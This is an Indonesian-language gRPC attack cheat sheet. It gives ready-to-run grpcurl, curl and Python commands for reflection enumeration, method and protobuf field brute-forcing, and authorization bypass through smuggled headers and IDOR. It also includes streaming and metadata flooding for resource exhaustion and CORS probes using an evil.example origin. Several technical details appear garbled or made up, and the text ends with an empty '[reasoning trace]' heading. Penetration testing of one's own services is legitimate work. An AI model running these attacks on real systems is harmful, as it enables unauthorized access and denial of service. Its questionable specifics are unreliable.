# grpc — api

# gRPC: Reflection Enumeration, Method Fuzzing, Protobuf Field Guessing, Authz per Method, Streaming Abuse, grpc-web Testing

---

## 1. Reflection Enumeration (grpcurl)

Server yang mengaktifkan `grpc.reflection.v1alpha.ServerReflection` / `grpc.reflection.v1.ServerReflection` membocorkan seluruh deskriptor service. Ini jalur enumerasi utama sebelum apa pun.

### 1.1 Deteksi cepat

```bash
# versi tool
grpcurl -version            # contoh: grpcurl v1.9.1

# list service (butuh reflection atau -protoset)
grpcurl -plaintext target:50051 list
grpcurl -insecure target:443 list          # TLS self-signed
grpcurl -d @ -plaintext target:50051 grpc.reflection.v1.ServerReflection/ServerReflectionInfo <<'EOF'
{"list_services":""}
EOF
```

Yang dikirim: `ServerReflectionRequest{list_services:""}`.
Yang muncul: daftar FQDN service, mis. `helloworld.Greeter`, `grpc.health.v1.Health`, `grpc.reflection.v1.ServerReflection`.
Kenapa berhasil: reflection = fitur debug default di banyak framework (grpc-go, grpc-java) bila diaktifkan; sering ikut ter-deploy di staging/prod.

### 1.2 Deskriptor lengkap per service

```bash
grpcurl -plaintext target:50051 describe helloworld.Greeter
grpcurl -plaintext target:50051 describe helloworld.HelloRequest
```

Output = `.proto` rekonstruksi (field, tipe, nomor tag, enum). Ini yang memberi nomor field untuk §3.

### 1.3 Dump protoset untuk dipakai offline

```bash
grpcurl -plaintext -protoset-out dump.protoset target:50051 describe >/dev/null
# atau via reflection langsung ke file
grpcurl -plaintext target:50051 list | \
  awk '{print "grpcurl -plaintext -protoset-out dump.protoset target:50051 describe "$1}' | sh

# inspeksi offline
grpcurl -protoset dump.protoset list
grpcurl -protoset dump.protoset describe helloworld.Greeter
```

### 1.4 Bila reflection mati

```bash
# coba endpoint reflection v1 vs v1alpha
grpcurl -plaintext target:50051 grpc.reflection.v1.ServerReflection/ServerReflectionInfo <<<'{"list_services":""}'
grpcurl -plaintext target:50051 grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo <<<'{"list_services":""}'

# server yang hanya expose health
grpcurl -plaintext target:50051 grpc.health.v1.Health/Check <<<'{"service":""}'
```

Jika keduanya `Unimplemented`, lanjut ke §2 (fuzzing method name) + §3 (field guessing).

---

## 2. Method Fuzzing

Tujuan: menemukan method yang ada walau tanpa reflection, dan memetakan permukaan authz per method.

### 2.1 Header/status sebagai oracle

grpc-go mengembalikan:
- `Unimplemented` → method tidak ada
- `Unauthenticated` / `PermissionDenied` → method **ada**, kena auth
- `InvalidArgument` → method **ada**, payload salah
- `Unavailable` / `DeadlineExceeded` → ada tapi downstream mati

```bash
# brute method name dari wordlist service/method
while read m; do
  out=$(grpcurl -plaintext -max-time 2 -d '{}' "target:50051" "$m" 2>&1)
  case "$out" in
    *Unimplemented*) ;;
    *) echo "[$m] -> $out" ;;
  esac
done < methods.txt
```

`methods.txt` contoh:
```
helloworld.Greeter/SayHello
helloworld.Greeter/Admin
helloworld.Greeter/DeleteUser
grpc.health.v1.Health/Check
```

### 2.2 Fuzzing lewat `.proto` lokal (tanpa reflection)

Kalau `.proto` bocor (repo, APK, JS bundle, s3), pakai langsung:

```bash
grpcurl -plaintext -import-path ./proto -proto helloworld.proto \
  -d '{"name":"x"}' target:50051 helloworld.Greeter/SayHello
```

### 2.3 Enumerasi via grpc-web di browser bundle

```bash
# grpc-web method path = /<pkg>.<svc>/<method>
rg -o '/[a-zA-Z0-9_.]+/[A-Za-z0-9_]+' app.bundle.js | sort -u
```

---

## 3. Protobuf Field Guessing

Saat tanpa `.proto`: field wire-format = `tag << 3 | wire_type`. Anda bisa mengirim field tak dikenal dan membaca reaksi server.

### 3.1 Wire type cheatsheet

| wt | tipe | encoding |
|----|------|----------|
| 0 | varint (int32/64, bool, enum) | 1–10 byte LEB128 |
| 1 | fixed64 (double, sfixed64) | 8 byte LE |
| 2 | length-delimited (string, bytes, message) | varint len + data |
| 5 | fixed32 (float, sfixed32) | 4 byte LE |

### 3.2 Kirim field liar via grpcurl (JSON mode, field tak ada di schema)

grpcurl dengan `-protoset`/reflection akan **menolak** field tak dikenal. Untuk benar-benar mengirim tag arbitrer, pakai `grpcurl -d @` dengan **`.` file descriptor**? Itu juga tervalidasi. Solusi: pakai `grpc_cli` (grpc 1.60+) atau `grpcurl` terhadap `google.protobuf.Struct`, atau bypass via tool raw.

Raw wire bytes via `grpcurl` tidak didukung langsung. Gunakan Python `grpc` + `SerializeToString=False`:

```python
# proto-less: kirim bytes mentah ke /pkg.Svc/Method
import grpc, sys
ch = grpc.insecure_channel("target:50051")
# payload: field 1 (varint) = 1 ; field 2 (string) = "admin" ; field 9 (varint)=1
payload = b"\x08\x01" + b"\x12\x05admin" + b"\x48\x01"

call = ch.unary_unary("/helloworld.Greeter/SayHello",
                      request_serializer=lambda b: b,
                      response_deserializer=lambda b: b)
print(call(payload, timeout=3))
```

Yang dikirim: tag 1 varint=1, tag 2 string="admin", tag 9 varint=1.
Yang muncul: bytes respons; decode manual pakai `protoc --decode_raw`:

```bash
echo -n "$RESP_BYTES" | protoc --decode_raw
```

### 3.3 Brute tag 1..N

```python
import grpc
ch = grpc.insecure_channel("target:50051")
call = ch.unary_unary("/pkg.Svc/Method",
                      request_serializer=lambda b: b,
                      response_deserializer=lambda b: b)
for tag in range(1, 51):
    for wt, val in [(0, 1), (2, b"admin")]:
        key = (tag << 3) | wt
        if wt == 0:
            msg = bytes([key]) + b"\x01"
        elif wt == 2:
            msg = bytes([key, len(val)]) + val
        try:
            r = call(msg, timeout=1)
            print(f"tag={tag} wt={wt} OK len={len(r)}")
        except grpc.RpcError as e:
            if e.code() != grpc.StatusCode.INVALID_ARGUMENT:
                print(f"tag={tag} wt={wt} {e.code()} {e.details()}")
```

Kenapa berhasil: proto3 mengabaikan field tak dikenal, tapi **perubahan status** (INVALID_ARGUMENT vs OK) membocorkan eksistensi tag dan tipe.
Kenapa gagal: server memakai `DiscardUnknown: true` + default-deny → semua tag tampak sama; atau ada WAF gRPC yang menolak sebelum handler.

### 3.4 Decode respons tanpa schema

```bash
grpcurl -plaintext -d '{}' target:50051 pkg.Svc/Method | \
  protoc --decode_raw
```

---

## 4. Authz per Method

gRPC tak punya route-level ACL bawaan. Authz ditegakkan di interceptor (server) atau di API gateway (Envoy, grpc-gateway, nginx 1.25 `grpc_pass`). Celah muncul saat:
- interceptor whitelist method tertentu (mis. `Health`, `Reflection`),
- gateway memetakan HTTP path → method tanpa cek role,
- method baru tak terdaftar di policy lama.

### 4.1 Baseline: mapping status per method terhadap token

```bash
TOK="Bearer eyJ..."; # JWT user biasa
grpcurl -plaintext -H "authorization: $TOK" \
  -d '{"name":"x"}' target:50051 helloworld.Greeter/SayHello
# → OK, artinya method butuh token, user biola boleh

grpcurl -plaintext -H "authorization: $TOK" \
  -d '{"id":"1"}' target:50051 admin.UserAdmin/DeleteUser
# → PermissionDenied (bagus) atau OK (temuan)
```

### 4.2 Tanpa token = oracle

```bash
grpcurl -plaintext -d '{}' target:50051 admin.UserAdmin/DeleteUser
# Unauthenticated → auth ada
# PermissionDenied → method ada + authz spesifik
# OK → terbuka
```

### 4.3 Bypass metadata / header smuggling

```bash
# beberapa interceptor hanya cek header "authorization"
grpcurl -plaintext -H "authorization: Bearer guest" ...
grpcurl -plaintext -H "Authorization: Bearer guest" ...
grpcurl -plaintext -H "x-forwarded-user: admin" ...
grpcurl -plaintext -H "x-user: admin" ...
grpcurl -plaintext -H "grpcgateway-authorization: Bearer admin" ...
```

Yang dikirim: header alternatif yang sering dipetakan `nginx 1.25` / Envoy menjadi metadata user.
Kenapa berhasil: gateway mempercayai header dari edge; backend tidak memvalidasi ulang.

### 4.4 IDOR via field guess

```bash
grpcurl -plaintext -H "authorization: $TOK" \
  -d '{"user_id":1}' target:50051 admin.UserAdmin/GetUser
grpcurl -plaintext -H "authorization: $TOK" \
  -d '{"user_id":2}' target:50051 admin.UserAdmin/GetUser   # akses user lain?
```

### 4.5 nginx 1.25 `grpc_pass` — path vs method mismatch

Konfigurasi umum:
```nginx
location /admin. {
    grpc_pass grpc://backend:50051;
    # tanpa auth_request / tanpa allow
}
location / {
    grpc_pass grpc://backend:50051;
}
```
Jika `location /admin.` (regex/trailing-dot bypass) atau ada prefix lain, method bisa lolos route-scoped auth. Uji:

```bash
# lewat nginx, path gRPC = service FQDN
curl -k --http2-prior-knowledge -X POST \
  -H "content-type: application/grpc" \
  -H "te: trailers" \
  --data-binary @req.bin \
  https://nginx-admin.example.com/admin.UserAdmin/DeleteUser
```

---

## 5. Streaming Abuse

### 5.1 Server-streaming: resource exhaustion

```bash
# subscription tanpa batas; klien tidak pernah Cancel
grpcurl -plaintext -d '{"topic":"all"}' target:50051 feed.Feed/Subscribe
```
Kirim N klien paralel; perhatikan RAM/FD server. Yang muncul: stream hidup terus sampai `max_connection_age` / `max_stream_duration` (default grpc-go: tak ada). Kenapa gagal dibereskan: server tak set `MaxStreamDuration` & `ConnectionTimeout`.

### 5.2 Client-streaming: unbounded upload

```python
import grpc
ch = grpc.insecure_channel("target:50051")
def gen():
    chunk = b"A"*1024*1024
    while True:
        yield b"\x0a\x80\x80\x80\x01" + chunk  # tag1 len=1MiB
call = ch.stream_stream("/upload.Svc/Put",
                       request_serializer=lambda b: b,
                       response_deserializer=lambda b: b)
print(call(gen()).code())
```
Kirim > `max_receive_message_length` (grpc default 4 MiB; banyak framework naikkan ke 64/128 MiB). Yang muncul: hanya `RESOURCE_EXHAUSTED` **setelah** buffer pengisian — tidak membuang bandwidth/payload.

### 5.3 Bidirectional: keepalive abuse

```bash
# klien kirim PING terus-menerus tanpa data -> paksa server ukur keepalive
# tools: grpcurl tidak mendukung; pakai ghz
ghz --insecure --proto ./svc.proto --call svc.Svc.Stream \
    -d '{"x":1}' --connections 50 --duration 10s target:50051
```

### 5.4 Half-close & reconnect churn

```python
# kirim metadata + stream open, lalu tutup tanpa half-close
call = ch.stream_stream(...)
it = call(iter([]))  # langsung kosong -> FIN
```
Banyak server (`grpc-java` < 1.60, `grpc-go` < 1.63) tidak membatasi stream count per koneksi → FD exhaustion.

### 5.5 Metadata flood

```bash
# ribuan header per request
for i in $(seq 1 500); do H="$H -H x-f$i:v"; done
grpcurl $H -plaintext -d '{}' target:50051 svc.Svc/M
```
Yang muncul: `RESOURCE_EXHAUSTED` bila `MaxHeaderListSize` diset; bila tidak, memori server naik.

---

## 6. Testing dari Browser (grpc-web)

grpc-web = framing di atas HTTP/1.1 atau HTTP/2 (via Envoy/grpc-web proxy). Di browser (Chrome 131), request tak bisa set header `te: trailers`, jadi butuh proxy.

### 6.1 Enumerasi dari DevTools

Filter Network → `Fetch/XHR` → cari path `*.Service/Method`. Response body berisi frame:
```
<1-byte flag><4-byte big-endian len><protobuf payload>
```
flag `0x00` = data, `0x80` = trailer.

Decode manual:

```python
import binascii, io
data = open("resp.bin","rb").read()
i=0
while i < len(data):
    flag = data[i]; ln = int.from_bytes(data[i+1:i+5],"big"); i+=5
    chunk = data[i:i+ln]; i+=ln
    print(flag, chunk.hex())
    if flag & 0x80:  # trailer: "grpc-status: 0\r\n"
        print(chunk.decode())
    else:
        # pipe ke protoc --decode_raw
        open("payload.bin","wb").write(chunk)
```

### 6.2 Replay tanpa browser (curl)

grpc-web unary request body = `00 <len:4> <protobuf>`:

```bash
# payload: field1 string "x"  -> 0x0a 0x01 'x'
printf '\x00\x00\x00\x00\x03\x0a\x01x' > req.bin

curl -k --http2-prior-knowledge -X POST \
  -H "content-type: application/grpc-web+proto" \
  -H "x-grpc-web: 1" \
  -H "x-user-agent: grpc-web-javascript/0.1" \
  --data-binary @req.bin \
  https://web.example.com/helloworld.Greeter/SayHello \
  -o resp.bin -D headers.txt

xxd resp.bin | head
grep -i grpc-status headers.txt
```

Yang dikirim: frame grpc-web unary.
Yang muncul: `grpc-status` di trailer **dan** header (proxy-dependent), frame data + frame trailer `80 00 00 00 0B 67 72 70 63 2D 73 74 61 74 75 73 ...` (`grpc-status: 0`).

### 6.3 Server-streaming via curl (chunked)

```bash
curl -k --http2-prior-knowledge -N -X POST \
  -H "content-type: application/grpc-web+proto" \
  -H "x-grpc-web: 1" \
  --data-binary @req.bin \
  https://web.example.com/feed.Feed/Subscribe --output -
```

### 6.4 CORS & preflight abuse

```bash
curl -i -k -X OPTIONS \
  -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: content-type,x-grpc-web,x-user-agent,authorization" \
  https://web.example.com/helloworld.Greeter/SayHello
```
Yang muncul: `access-control-allow-origin: *` atau echo `Origin` + `allow-credentials: true` → kritis untuk grpc-web.

### 6.5 Envoy grpc-web filter — path allowlist bypass

Envoy filter `envoy.filters.http.grpc_web` + `envoy.filters.http.cors` sering pakai:
```yaml
cors:
  allow_origin_string_match: [{prefix: "https://app.example.com"}]
```
Uji substring:
```bash
curl -i -X OPTIONS -H "Origin: https://app.example.com.evil.example" ...
curl -i -X OPTIONS -H "Origin: https://evilapp.example.com" ...
```

### 6.6 Response decode lengkap (Python, tanpa browser)

```python
import requests, binascii
r = requests.post("https://web.example.com/helloworld.Greeter/SayHello",
    headers={"content-type":"application/grpc-web+proto","x-grpc-web":"1"},
    data=b"\x00\x00\x00\x00\x03\x0a\x01x",
    verify=False)
data=r.content; i=0
while i<len(data):
    flag=data[i]; ln=int.from_bytes(data[i+1:i+5],"big"); i+=5
    print(flag, data[i:i+ln]); i+=ln
```

---

## 7. Jebakan Operasional (kenapa teknik gagal di lapangan)

- **`grpcurl` reflection ke TLS dengan ALPN mismatch**: bila target hanya menerima `h2` murni dan load balancer (AWS ALB sebelum 2023, nginx 1.25 tanpa `http2 on;`) terminator HTTP/1.1, `grpcurl -insecure` gagal `transport: authentication handshake failed`. Pakai `-plaintext` hanya jika yakin ada L4 passthrough.
- **`grpcurl` auto-fallback reflection**: bila reflection tak ada, `describe` & method call tanpa `-proto`/`-protoset` gagal dengan `server does not support the reflection API`. Field guessing butuh bytes mentah — `grpcurl` **tidak** bisa mengirim tag di luar schema; jangan buang waktu, pindah ke Python/`grpc_cli`.
- **`DiscardUnknown=true` di grpc-go / grpc-java**: semua tag liar diterima tanpa error → oracle status hilang; field guessing jadi buta.
- **Interceptor auth default**: `auth.NewAuth` di grpc-go 1.63+ mengembalikan `Unauthenticated` untuk **semua** method tak terdaftar; method fuzzing jadi false positive (semua terlihat "ada").
- **Envoy gRPC-Web + CORS preflight cache**: Chrome 131 cache preflight 2 jam; uji CORS pakai `--no-cache` di curl atau start sesi Profil baru, jangan simpulkan "blokir" dari preflight lama.
- **`grpc-status` di header, bukan trailer**: proxy grpc-web Envoy menaruh status di header untuk unary; parser yang hanya baca trailer akan mengira request sukses saat `grpc-status: 7` (PermissionDenied).
- **Streaming test tanpa `MaxStreamDuration`**: server tampak hang = sukses exhaustion, bukan bug tool; hentikan manual atau FD server ikut habis (efek samping ke environment).
- **Payload > 4 MiB di grpc-web**: Chrome 131 fetch akan tetap kirim, tapi proxy (`nginx 1.25` default `client_max_body_size 1m`) menolak 413 sebelum gRPC code apa pun — cek layer HTTP dulu.
- **`protoc --decode_raw` kehilangan tipe**: bytes `0a 03 61 64 6d` bisa string "adm" atau nested message; cross-check dengan variasi input sebelum menyimpulkan nama field.
- **Reflection di CI/staging dimatikan tapi di prod aktif**: jangan simpulkan "tak ada reflection" dari satu environment; cek `grpc.health.v1.Health` sebagai proxy keberadaan grpc-go default stack.
- **ALPN & HTTP/2 prior knowledge**: `curl --http2-prior-knowledge` gagal di server yang butuh upgrade (HTTP/1.1 → h2c), dan `--http2` gagal ke endpoint h2c murni. Uji keduanya; `nghttp -nv` lebih diagnostik.
- **Windows 11 24H2 `curl.exe` bawaan**: mendukung `--http2` tapi **tidak** `--http2-prior-knowledge` pada build < 8.9; gunakan `choco install curl` atau WSL untuk skrip §6.
- **gRPC-Web text mode** (`application/grpc-web-text+proto`): body base64, framing berbeda; skrip bytes mentah §6.2 akan salah parse. Cek `content-type` respons sebelum decode.

---

## [reasoning trace]


